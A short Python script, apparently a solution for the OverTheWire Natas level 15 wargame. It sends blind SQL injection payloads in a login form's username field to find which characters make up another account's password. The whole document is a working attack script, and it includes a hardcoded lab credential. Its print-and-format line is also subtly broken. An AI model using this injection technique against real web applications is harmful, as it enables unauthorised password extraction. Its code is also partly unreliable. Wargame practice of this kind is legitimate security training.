#!/bin/python
import requests, string

base_url = "http://natas15.natas.labs.overthewire.org/index.php"
auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"


all_chars = ''.join([string.ascii_letters, string.digits])

password_dictionary = []
exists_str = "This user exists."
for char in all_chars:
  querystr = ''.join(['natas16" and password like BINARY "%',char,'%'])
  payload = { 'username': querystr }
  r = requests.post(base_url, auth=(auth_username, auth_password), data=payload)  
  if exists_str in r.text:
    password_dictionary.append(char)
    print("Password Dictionary: {0}").format(''.join(password_dictionary))
print("Dictionary build complete.")

